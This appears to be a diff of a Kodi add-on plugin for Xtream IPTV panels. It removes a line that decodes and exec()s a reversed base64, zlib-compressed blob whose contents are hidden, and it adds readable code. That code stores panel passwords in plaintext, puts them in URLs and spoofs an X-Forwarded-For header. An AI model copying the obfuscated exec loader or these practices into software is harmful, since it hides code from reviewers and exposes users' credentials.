@@ -1,2 +1,122 @@
-# 1691773113
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IqS1JNw//97zyXJfgtNh9bv1jxZUyQGrIHPyrp/vyq3XhqHoAMxINOQh5itAy+MbAUCF+sf8eAYCgV5C3hW917fTMHCiFTBOPqYVS8VhUOyNho+vXIhOyhrg/IkTPxNyzwpSKtIzKrKa+uc281U9iBAgajTWjG8olnWS2KdbztH4DFdVHOvjguyDoyH/XUlBaWbbGzJz9DjdSsjMvZ9cnN4FBZLwuqALoOUfods9gzM4gnk6kjti9ZLyUigUXZZ7btD5rbtMSW6Z7umURz1EVHMkjjQoprZ+g2lqFGSOYJy3VeQsCE4DuttUNRvZ1kbT603okd2cknt4sG3wzFIlBKiH6dSASD+9YKzSUAdLoCTRRBJBnfVLrB+7hBrtFsp3reTGsh1qzjjCsrakABmtCvuh2ylNV1E06hoHWy3y3o2mu2MIM8pwlYeN3/66HUZBlenArIQDDs4rp6JSeljQt5v4qh0g12Bbo49oI0SEW6FWxDV0lq7JaPTn27JaBhopypRzk4EZ2oL1V/ZgBu8pLSmuHfxHJ/ZmTu0ps3ilZEBudm78ldszuMuRH27pa26tnJ0m9WPGayI256/xR4rbgpYRlujs+IUwIVc+Gw0kvEHX8iGCTrwZ9arNBgAt7wX/mgpRrAYPu3yLwWq+VY9pLUJPL9r9x6mFN3j2jaPCUI7wViMVFOvmjGYqtcy4d/OKAkvAlvG0t4ADrUE5LdKswl1UrSjruGSS5ndwKCUXQmdyhj0T6v1mYA95EoG10YySYu8eO2/Foi2E10hzfXhPZZtMsB2msZXYYPPAT3HywqPsdIQLJaVaheN5CZ4TV8mBkQW1an+Zrbt7Q4xZsYI+zrMembMyb6wPWcSrIz8d9BR60+il+PkOoAwMG4iOWtzGGJ0omTq+nns0GLVAmWNsUdDtFIsVthOj2/kYjWDWBa8PKOksU1D5oOIVtgu6Z2rnxiYHt/4QaUbVBBoHycwwfVMb4b/ov51gg2cqR034Uk+sy6FZLBR1DAY2Q5op1VNFngZlymaQBDSTrzZtAHba4wGhhjHVB0+M4dPfhCtnznnUEm9N1MyTDNd6Phl5QUidPEWqEUfk1SxIXcdnp/cCmxaHkNkPFcmYN6yl1mkxtVQ+RBIEEpXGcI1Whg9Ys+pkHDMxGceVYIBjWzzlVOoHiTPWKctaeS1jmE6798o+RC5YIECMEezjGlAhxEippRhKAb3iAuLBjM63g9izBYk9qgJjZ8jQ45Y0xKP7zMMhzZGLU1nPvaphkWbqM5NPpbNxwPIHK9tPd4Y8h+bYfK4wrYHxJ8TRP9WRJUTKwTHqoTdto63F4a02AFJhlw8Qpts5tMV2iNyQNyIaMWTLGspbDvGQJ7M7F63O8g2G+QQ8leswUhdo5hcnI2SGX3U5ahoQDGTZIH6qFdhajhFq3jmgkFIhv3/B3+Dz0JGkvdq30QIvCSH7ab3Gryf9ZkLEdshVHsoCb3cz6y0jVZYlp8HIfVgTo8sDAG5XLMu/bMYQ8cig3VySo+Wz4w0anf+o098p35lCL/UnbdkcOoFdz17r06M7WGEwJMD+VWMEDfEbQL5IlLZrmuip+b9llx3F+9qWZ+hLi7jdjyuyh2JNo6fmWiMrfI6CKfRbRZE6TNB1Q0DUfzaxgCM7moCgubMmWNfsYpcpErsRjkWDr01IBbOgjwIPvk5iOh1622dtwswj5Dsf0GzkTFkcWjz3yrj2s6tGgvNVBLmoMKrfKHhcfFNJYzKrQfyyYgY+VPmxPFKQR71Gr8YXnbMtAJz5jz0Z490jwn9ajRvKcVQsjObhmCkpT2G/71Il8flALYwl4VoeWTXgTXQrY8reEvZPR2MpMgtgSegZA6V50LJtInMVApZsWWnSkB4vhWKWO9gspiIvu/nM4owhF7NRnkQKmprZJEA7JcA7iImib4vZyxlgjZ8R/qWD7vwTnvUJDqIUQ4DSqKhJko7itGyahr1BEm7uScVmuaEEZBohzSlh9jsmjGdUzGwEulENCdMMYjKXgfKrEtmDlLWh0BZ0k11+bpW3/GKX9kS6+dZWc19ug0YthVWWp+CVuUh4TB6QsQzbfBg0IZO//RZzPLIPjV5WV5jAhlNZM/TgTDn8kUWz94o024GNB0zrcdK0HRRHZZdsk+QXtoCAOEEGKmEwwxHs2zgUonhlHJeAL431NZFsJYlVp5W7ESu/3Svv99L8hHnZbve3hqX5Va8sEZ1zKzwR4kqWfQhLsfxzYkE9YdBOB31StGcZk3tm3z/QobJTUo09hHnkiUQoefbGEh7oZcbZXm1LeK5AaiOUxo4Yox/JnyErO8A+luJH1Fs9fF1+CxWApVebZ5Lo+1JZ+crNLwVwfaiMsj0oOnFFSowuer2cDNef3grkFESWmCfEJBc6B10Zp4NKLBPnPEEnNPc2RYPWlz7WN5EuSPzMIvglkOgEuX59xahkVLpwDaXPQtGQT46HtKUCaZ1P03PS3R4Irb5rwsBoJPeBfs6uuEC1yLj/vZ0cEwIPjqsZd14Z1+1W+vJrAM15Xhv/eMSXA2Zkq7ZXUFDEG2p6RXjAsBnmXkkQ7SewILdfqTpElCixtFNiL++EVw19kEQi6EmKID7XSJ+1iQSvtDE3Xd/90l3+JweINMQ8PV6PlgTPEHKlLrZigrwn/ZYWnsS22HgzkgiR8ESlNO8DxSar5ptd7ugcAaqQiK6xEynXv1KyqEkDsNGs4f1DP9wUoVEWMrYcUBTkCjU1qNWdvBk2vbDa3U0LDG5tA4sNp7BBZrwTLSWwVel689lObqr7y2YBI+sPeeu3rPx7fpkoIMt+OXuruQ603rnzcVJVsVp5rEWPWDW5vi8TZ0idAh/zcgUEx5F4xndQmbjzHdStaynddC+wD+t6zuKoOEbdViGVujztigDYeHV1WSzTbrTcTp2DAoRLqqtub1DMU1zMyiGLsSYDdRtIVjmQc5szVw9deK4ICCeNgff4OUqoWfIRsMAhcMtlo2RrnIgFkc4iDYWGZurAIe6YBmY9ri1565YiuhuBYswFwOlQuxgwbdI0KDk1wmkD390YkC3hUzzl3B5B0Frivki4un1ZfVQoEMmGE5/hD+olhAZcSOXzKvn3uwdO7neybHYkl97smhZ/sn4kYyixWNmG3409hPLL4WndocOWSi3Hwh/8m2uur5OV0a1y1f6NOvFYYzvaxPzS4gKMBWIWyPGRtBenQE0ASvSR8D/Pz+3f/e/+/Lz7rY85Ty8g4txX6DLF7i7HTuzuIC2pAEc3TfJRUoFpSU0lNwJe'))
+from resources.lib.plugin import Plugin
+from resources.lib.plugin import run_hook
+import requests, xbmcgui, xbmcaddon, os, xbmc
+from xbmcvfs import translatePath
+
+class xtream(Plugin):
+    name = "xtream"
+    priority = 100
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+
+    def process_item(self, item):
+        if self.name in item:
+            link = item.get(self.name, "")
+            action = link["action"]
+            if action in ["input", "previous", "clear"]:
+                item["link"] = f"{self.name}/{action}"
+            else:
+                address = link["address"]
+                username = link["username"]
+                password = link["password"]
+                item["link"] = f"{self.name}/{action}/{address}?username={username}&password={password}"
+                if "cat" in link:
+                    item["link"] += "&cat=" + link["cat"]
+            item["is_dir"] = action in ["category", "categories", "input", "previous"]
+            list_item = xbmcgui.ListItem(item.get("title", item.get("name", "")), offscreen=True)
+            item["list_item"] = list_item
+            return item
+    
+    def routes(self, plugin):
+        @plugin.route(f"/{self.name}/input")
+        def dialog_input():
+            host = xbmcgui.Dialog().input("Enter host (ex. http://example.com:25461)")
+            if not host: return
+            username = xbmcgui.Dialog().input("Enter username")
+            if not username: return
+            password = xbmcgui.Dialog().input("Enter password")
+            if not password: return
+            link = f"{host};;;{username};;;{password}" + "\n"
+
+            addon = xbmcaddon.Addon()
+            USER_DATA_DIR = translatePath(addon.getAddonInfo("profile"))
+            if not os.path.exists(USER_DATA_DIR):
+                os.makedirs(USER_DATA_DIR)
+            exists = False
+            if os.path.exists(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt")):
+                with open(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt"), "r") as f:
+                    lines = f.readlines()
+                    if link in lines:
+                        exists = True
+            if not exists:
+                with open(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt"), "a+") as f:
+                        f.write(link)
+
+            categories(host, username, password)
+        
+        @plugin.route(f"/{self.name}/previous")
+        def previous():
+            addon = xbmcaddon.Addon()
+            USER_DATA_DIR = translatePath(addon.getAddonInfo("profile"))
+            if not os.path.exists(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt")):
+                return xbmcgui.Dialog().ok("Error", "No previous Xtream links have been entered.")
+            with open(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt"), "r") as f:
+                lines = f.readlines()
+            links = []
+            for line in lines:
+                line_split = line.split(";;;")
+                links.append(f"{line_split[0]}, {line_split[1]}, {line_split[2]}")
+            res = xbmcgui.Dialog().select("Previous links", links)
+            if res != None and res >= 0:
+                line_split = lines[res].strip().split(";;;")
+                categories(line_split[0], line_split[1], line_split[2])
+        
+        @plugin.route(f"/{self.name}/clear")
+        def clear():
+            addon = xbmcaddon.Addon()
+            USER_DATA_DIR = translatePath(addon.getAddonInfo("profile"))
+            if os.path.exists(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt")):
+                os.remove(os.path.join(USER_DATA_DIR, f"{self.name}_previous.txt"))
+            xbmcgui.Dialog().ok("Clear", "Previous Xtream links have been cleared.")
+            
+        @plugin.route(f"/{self.name}/categories/<path:url>")
+        def categories(url, username=None, password=None):
+            if username == None or password == None:
+                username = plugin.args["username"][0]
+                password = plugin.args["password"][0]
+            r = requests.get(url + f"/panel_api.php?username={username}&password={password}").json()
+            jen_list = []
+            for key, value in r["categories"].items():
+                for cat in value:
+                    jen_list.append({
+                        "title": f"{key.capitalize()} | {cat['category_name']}",
+                        self.name: {
+                            "address": url,
+                            "username": username,
+                            "password": password,
+                            "action": "category",
+                            "cat": cat["category_id"]
+                        },
+                        "type": "dir"
+                    })
+            jen_list = [run_hook("process_item", item) for item in jen_list]
+            jen_list = [run_hook("get_metadata", item, return_item_on_failure=True) for item in jen_list]
+            run_hook("display_list", jen_list)
+        
+        @plugin.route(f"/{self.name}/category/<path:url>")
+        def category(url):
+            username = plugin.args["username"][0]
+            password = plugin.args["password"][0]
+            category = plugin.args["cat"][0]
+            r = requests.get(url + f"/panel_api.php?username={username}&password={password}").json()
+            jen_list = []
+            for channel_id, channel in r["available_channels"].items():
+                if channel["category_id"] != category: continue
+                jen_list.append({
+                    "title": channel["name"],
+                    "icon": channel["stream_icon"],
+                    "sportjetextractors": [f"jetproxy://{url}/live/{username}/{password}/{channel_id}.m3u8?&Connection=keep-alive|X-Forwarded-For=24.37.42.200"],
+                    "type": "item"
+                })
+            jen_list = [run_hook("process_item", item) for item in jen_list]
+            jen_list = [run_hook("get_metadata", item, return_item_on_failure=True) for item in jen_list]
+            run_hook("display_list", jen_list)
